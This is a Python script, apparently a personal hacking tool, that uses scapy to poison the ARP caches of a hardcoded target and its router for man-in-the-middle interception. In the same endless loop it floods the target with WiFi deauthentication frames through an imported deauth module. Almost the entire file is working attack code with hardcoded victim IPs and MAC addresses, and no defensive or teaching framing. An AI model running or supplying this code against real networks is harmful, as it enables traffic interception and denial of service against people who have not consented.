import scapy.all as scapy
import time
import termcolor
import threading
import concurrent.futures
import deAuth as da
import argparse
import time
import os
import sys

import argparse
import time
import os
import sys




def get_mac_address(ipaddress):
    count = 0
    answer = []
    while True :
        broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_layer = scapy.ARP(pdst=ipaddress)
        get_mac_packet = broadcast_layer / arp_layer
        answer= scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
        if str(answer).startswith("None"):
            answer=[]
            continue
        else:
            try :
                return answer[0][1].hwsrc
            except :
                count = count + 1
                print(termcolor.colored("[!!] Unable to find MAC add of the victim ", "red"))
                print(termcolor.colored("ARP will send automatically in ["+str(count*5)+"] second later .....", "red"))
                print("")

                if count>1 :
                    print(termcolor.colored("################################################", "red"))
                    print(termcolor.colored("[*] You must sure targeted IP machine up [*]", "red"))
                    print(termcolor.colored("################################################", "red"))

                time.sleep(count*5)






def spoof(router_ip , target_ip , router_mac , target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac , pdst= router_ip , psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac , pdst=target_ip  , psrc=router_ip)
    scapy.send(packet1)
    scapy.send(packet2)


target_ip = "192.168.1.105"
router_ip = "192.168.1.1"


with concurrent.futures.ThreadPoolExecutor() as executor:
    future = executor.submit(get_mac_address,target_ip)
    target_mac=future.result()
    print(target_mac)


with concurrent.futures.ThreadPoolExecutor() as exec:
    future = exec.submit(get_mac_address,router_ip)
    router_mac=future.result()
    print(router_mac)


#target_mac = str(get_mac_address(target_ip))
#print(target_mac)
#router_mac = str(get_mac_address(router_ip))
#print(router_mac)



def sendDeAuth():
    targetmac = "90:63:3b:35:3d:12"
    gatewaymac = "98:48:27:38:82:e5"
    count = 100
    interval = 0.1
    iface = "Wi-Fi 2"
    verbose = True

    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0
        # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending {count} frames every {interval}s...")
        else:
            print(f"[+] Sending frames every {interval}s for ever...")

    da.deauth(targetmac, gatewaymac, interval, count, loop, iface, verbose)
    # printing some info messages"



try:

    while True:
        spoof(router_ip,target_ip,router_mac,target_mac)
        sendDeAuth()
        time.sleep(2)

except KeyboardInterrupt:
    print(termcolor.colored("[-] Closing ARP Spoofer ", "red"))
    exit(0)

